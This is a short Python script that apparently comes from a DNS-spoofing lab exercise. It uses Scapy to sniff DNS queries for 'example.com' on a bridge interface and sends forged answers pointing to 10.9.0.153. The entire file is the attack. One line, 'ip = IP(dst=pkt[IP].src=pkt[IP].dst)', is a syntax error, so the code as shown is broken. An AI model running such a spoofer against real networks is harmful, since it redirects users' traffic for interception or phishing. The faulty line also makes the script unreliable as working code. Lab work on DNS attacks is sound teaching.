#!/usr/bin/env python3

from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
	if DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8'):
		print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
		ip = IP(dst=pkt[IP].src=pkt[IP].dst) # Create an IP object
		udp = UDP(dport=pkt[UDP].sport, sport=53) # Create a UPD object
		Anssec = DNSRR(rrname=pkt[DNS].qd.qname, ttl=3600, rdata='10.9.0.153') # Create an aswer record
		dns = DNS(id=pkt[DNS].id, qr=1, aa=1, rd=0, ra=0, qd=pkt[DNS].qd, an=Anssec) # Create a DNS object
		
		spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
		send(spoofpkt)
		
myFilter = "udp and port 53" # Set the filter
pkt = sniff(iface='br-645c88f1fb70', filter=myFilter, prn=spoof_dns)

# if the above br- doesn't work try:
# br-cb9d20c00e2b

# started the rdata with 10.9.0.153